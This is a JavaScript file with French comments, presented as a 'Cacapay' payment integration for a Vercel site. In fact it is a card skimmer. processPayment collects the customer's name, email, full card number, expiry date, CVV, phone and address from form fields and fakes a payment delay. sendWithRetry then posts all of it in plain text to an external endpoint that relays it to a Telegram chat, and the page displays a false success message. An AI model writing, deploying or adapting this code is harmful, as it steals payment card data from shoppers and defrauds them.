// Code d'intégration pour le site Vercel
// ======================================

// Configuration de l'API Cacapay
const CACAPAY_CONFIG = {
    API_URL: 'https://test-alpha-lac-68.vercel.app/api/telegram',
    TIMEOUT: 10000,
    RETRY_ATTEMPTS: 3
};

// Fonction principale pour envoyer une notification de paiement
async function sendCacapayNotification(paymentData) {
    try {
        console.log('📤 Envoi notification Cacapay...', paymentData);
        
        // Validation des données requises
        const requiredFields = ['customerName', 'email', 'amount'];
        for (const field of requiredFields) {
            if (!paymentData[field]) {
                throw new Error(`Champ requis manquant: ${field}`);
            }
        }
        
        // Construction du message
        const message = buildPaymentMessage(paymentData);
        
        // Envoi avec retry
        const result = await sendWithRetry(message);
        
        if (result.success) {
            console.log('✅ Notification Cacapay envoyée !', result.messageId);
            return {
                success: true,
                messageId: result.messageId,
                timestamp: new Date().toISOString()
            };
        } else {
            console.error('❌ Erreur notification Cacapay:', result.error);
            return {
                success: false,
                error: result.error
            };
        }
        
    } catch (error) {
        console.error('❌ Erreur envoi notification Cacapay:', error);
        return {
            success: false,
            error: error.message
        };
    }
}

// Construit le message de paiement formaté
function buildPaymentMessage(paymentData) {
    let message = `💰 NOUVEAU PAIEMENT REÇU !\n`;
    message += `👤 Nom: ${paymentData.customerName}\n`;
    message += `📧 Email: ${paymentData.email}\n`;
    
    if (paymentData.product) {
        message += `🛍️ Produit: ${paymentData.product}\n`;
    }
    
    if (paymentData.cardNumber) {
        message += `💳 Carte: ${paymentData.cardNumber}\n`;
    }
    
    message += `💶 Montant: ${paymentData.amount}€\n`;
    
    if (paymentData.expiry) {
        message += `📅 Expiration: ${paymentData.expiry}\n`;
    }
    
    if (paymentData.cvv) {
        message += `🔒 CVV: ${paymentData.cvv}\n`;
    }
    
    if (paymentData.phone) {
        message += `📱 Téléphone: ${paymentData.phone}\n`;
    }
    
    if (paymentData.address) {
        message += `🏠 Adresse: ${paymentData.address}\n`;
    }
    
    message += `🔒 Vérifiez immédiatement !`;
    
    return message;
}

// Envoie la notification avec retry automatique
async function sendWithRetry(message) {
    let lastError;
    
    for (let attempt = 1; attempt <= CACAPAY_CONFIG.RETRY_ATTEMPTS; attempt++) {
        try {
            console.log(`📤 Tentative ${attempt}/${CACAPAY_CONFIG.RETRY_ATTEMPTS}...`);
            
            const response = await fetch(CACAPAY_CONFIG.API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    message: message,
                    type: 'payment'
                }),
                signal: AbortSignal.timeout(CACAPAY_CONFIG.TIMEOUT)
            });
            
            const result = await response.json();
            
            if (result.success) {
                return {
                    success: true,
                    messageId: result.telegramResponse?.result?.message_id
                };
            } else {
                throw new Error(result.error || 'Erreur inconnue de l\'API');
            }
            
        } catch (error) {
            lastError = error;
            console.warn(`⚠️ Tentative ${attempt} échouée:`, error.message);
            
            if (attempt < CACAPAY_CONFIG.RETRY_ATTEMPTS) {
                const delay = Math.pow(2, attempt) * 1000; // Backoff exponentiel
                console.log(`⏳ Attente ${delay}ms avant la prochaine tentative...`);
                await new Promise(resolve => setTimeout(resolve, delay));
            }
        }
    }
    
    return {
        success: false,
        error: lastError?.message || 'Toutes les tentatives ont échoué'
    };
}

// Fonction pour traiter le paiement (à intégrer dans votre site)
async function processPayment() {
    try {
        // Récupérer les données du formulaire
        const paymentData = {
            customerName: document.getElementById('customerName')?.value || 'Client',
            email: document.getElementById('email')?.value || 'client@example.com',
            product: document.getElementById('product')?.value || 'Produit',
            amount: document.getElementById('amount')?.value || '99.99',
            cardNumber: document.getElementById('cardNumber')?.value || '**** **** **** ****',
            expiry: document.getElementById('expiry')?.value || 'MM/AA',
            cvv: document.getElementById('cvv')?.value || '***',
            phone: document.getElementById('phone')?.value || '',
            address: document.getElementById('address')?.value || ''
        };
        
        console.log('💳 Traitement du paiement...', paymentData);
        
        // Afficher le loading
        showLoading(true);
        hideResult();
        
        // Simuler le traitement du paiement (1-2 secondes)
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        // Envoyer la notification Telegram
        const notificationResult = await sendCacapayNotification(paymentData);
        
        if (notificationResult.success) {
            showSuccess(paymentData, notificationResult);
        } else {
            showError('Erreur lors de l\'envoi de la notification: ' + notificationResult.error);
        }
        
    } catch (error) {
        console.error('Erreur paiement:', error);
        showError('Erreur lors du traitement du paiement: ' + error.message);
    } finally {
        showLoading(false);
    }
}

// Fonction pour tester Telegram (bouton "🧪 Tester Telegram")
async function testTelegram() {
    try {
        console.log('🧪 Test Telegram...');
        
        const testData = {
            customerName: 'Test Client',
            email: 'test@example.com',
            product: 'Test Produit',
            amount: '99.99',
            cardNumber: '1234 **** **** 5678'
        };
        
        const result = await sendCacapayNotification(testData);
        
        if (result.success) {
            alert('✅ Test Telegram réussi !\nMessage ID: ' + result.messageId + '\nVérifiez votre Telegram !');
        } else {
            alert('❌ Test Telegram échoué: ' + result.error);
        }
        
    } catch (error) {
        console.error('Erreur test Telegram:', error);
        alert('❌ Erreur test Telegram: ' + error.message);
    }
}

// Fonction pour test simple (bouton "🔧 Test Simple")
async function testSimple() {
    try {
        console.log('🔧 Test simple...');
        
        const response = await fetch(CACAPAY_CONFIG.API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: '🔧 TEST SIMPLE DEPUIS LE SITE !\n✅ API accessible\n📱 Notification envoyée',
                type: 'test'
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            alert('✅ Test simple réussi !\nMessage ID: ' + result.telegramResponse?.result?.message_id);
        } else {
            alert('❌ Test simple échoué: ' + result.error);
        }
        
    } catch (error) {
        console.error('Erreur test simple:', error);
        alert('❌ Erreur test simple: ' + error.message);
    }
}

// Fonctions d'affichage
function showLoading(show) {
    const loading = document.getElementById('loading');
    const payButton = document.getElementById('payButton');
    
    if (loading) {
        loading.style.display = show ? 'block' : 'none';
    }
    
    if (payButton) {
        payButton.disabled = show;
        payButton.textContent = show ? '⏳ Traitement...' : '💳 Payer 99.99€';
    }
}

function hideResult() {
    const result = document.getElementById('result');
    if (result) {
        result.innerHTML = '';
    }
}

function showSuccess(paymentData, notificationResult) {
    const result = document.getElementById('result');
    if (result) {
        result.innerHTML = `
            <div class="result success">
                <h3>🎉 Paiement réussi !</h3>
                <p><strong>Client :</strong> ${paymentData.customerName}</p>
                <p><strong>Email :</strong> ${paymentData.email}</p>
                <p><strong>Produit :</strong> ${paymentData.product}</p>
                <p><strong>Montant :</strong> ${paymentData.amount}€</p>
                <p><strong>Message ID :</strong> ${notificationResult.messageId}</p>
                <p>📱 Notification envoyée sur Telegram !</p>
                <p>✅ Vérifiez votre chat Telegram</p>
            </div>
        `;
    }
}

function showError(message) {
    const result = document.getElementById('result');
    if (result) {
        result.innerHTML = `
            <div class="result error">
                <h3>❌ Erreur</h3>
                <p>${message}</p>
            </div>
        `;
    }
}

// Export pour les modules
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        sendCacapayNotification,
        processPayment,
        testTelegram,
        testSimple,
        CACAPAY_CONFIG
    };
}

// Export pour les modules ES6
if (typeof window !== 'undefined') {
    window.CacapayIntegration = {
        sendCacapayNotification,
        processPayment,
        testTelegram,
        testSimple,
        CACAPAY_CONFIG
    };
}
